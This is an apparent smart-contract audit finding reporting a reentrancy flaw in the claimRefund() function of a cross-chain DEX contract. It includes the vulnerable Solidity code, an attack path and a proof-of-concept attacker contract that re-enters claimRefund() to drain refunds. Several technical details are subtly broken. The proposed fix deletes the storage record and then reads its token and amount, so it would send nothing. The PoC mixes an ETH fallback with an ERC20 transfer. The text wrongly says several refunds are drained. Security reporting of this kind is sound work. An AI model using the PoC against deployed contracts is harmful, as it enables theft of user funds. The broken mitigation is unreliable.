# Reentrancy on claimRefund() via ETH or Token Receiver Contracts

### Summary



In TransferNative.sol [L661-680](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L661-L680)   The transfer of ETH or tokens occurs **before** updating or deleting the refund state in `claimRefund()`. This allows a malicious contract receiving the refund to reenter `claimRefund()` multiple times before state is updated, draining funds intended for other users.

### Root Cause



In TransferNative.sol [L661-680](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L661-L680)       `claimRefund()` the transfer happens **before** deleting the refund info, violating the checks-effects-interactions pattern and allowing reentrancy.

```solidity


function claimRefund(bytes32 externalId) external {
    RefundInfo storage refundInfo = refundInfos[externalId];

    address receiver = msg.sender;
    if(refundInfo.walletAddress.length == 20) {
        receiver = address(uint160(bytes20(refundInfo.walletAddress)));
    }
    require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
    require(refundInfo.externalId != "", "REFUND_NOT_EXIST");

    // <-- External call before state update (Reentrancy risk)
    TransferHelper.safeTransfer(refundInfo.token, receiver, refundInfo.amount);

    // State update happens after transfer
    delete refundInfos[externalId];

    emit EddyCrossChainRefundClaimed(
        externalId,
        refundInfo.token,
        refundInfo.amount,
        abi.encodePacked(msg.sender)
    );
}

```


### Internal Pre-conditions



**1. Refund info for `externalId` exists (i.e., `refundInfo.externalId != ""`).
2. Caller is either whitelisted bot or refund receiver.
3. Refund receiver is a contract with malicious fallback/receive function capable of reentering `claimRefund()`.**

### External Pre-conditions



**1. The token transferred triggers code execution on receiver side (native ETH or ERC20 with callback).
2. No reentrancy guard implemented.**

### Attack Path

**1. Attacker calls `claimRefund()` for a refund.
2. Refund tokens/ETH transferred to attacker contract triggers fallback.
3. Fallback calls `claimRefund()` again for same `externalId` before deletion.
4. Steps 2-3 repeat draining multiple refunds.**

### Impact

The protocol loses all pending refund funds. Refunds intended for users can be fully drained by attacker.

### PoC



```solidity

contract RefundReentrancyAttack {
    IEddyCrossChain bridge;
    bytes32 refundId;

    fallback() external payable {
        if (address(bridge).balance > 0) {
            bridge.claimRefund(refundId); // reenter claimRefund()
        }
    }

    function attack(bytes32 _refundId) external {
        refundId = _refundId;
        bridge.claimRefund(refundId);
    }
}

```



### Mitigation

Update function to **delete refund info before transfer** and add a `nonReentrant` modifier:

```diff


function claimRefund(bytes32 externalId) external nonReentrant {
    RefundInfo storage refundInfo = refundInfos[externalId];

    address receiver = msg.sender;
    if(refundInfo.walletAddress.length == 20) {
        receiver = address(uint160(bytes20(refundInfo.walletAddress)));
    }
    require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
    require(refundInfo.externalId != "", "REFUND_NOT_EXIST");

+   // Effects: update state before interaction
    delete refundInfos[externalId];

-   // Interactions: transfer after state update
    TransferHelper.safeTransfer(refundInfo.token, receiver, refundInfo.amount);

    emit EddyCrossChainRefundClaimed(
        externalId,
        refundInfo.token,
        refundInfo.amount,
        abi.encodePacked(msg.sender)
    );
}

```
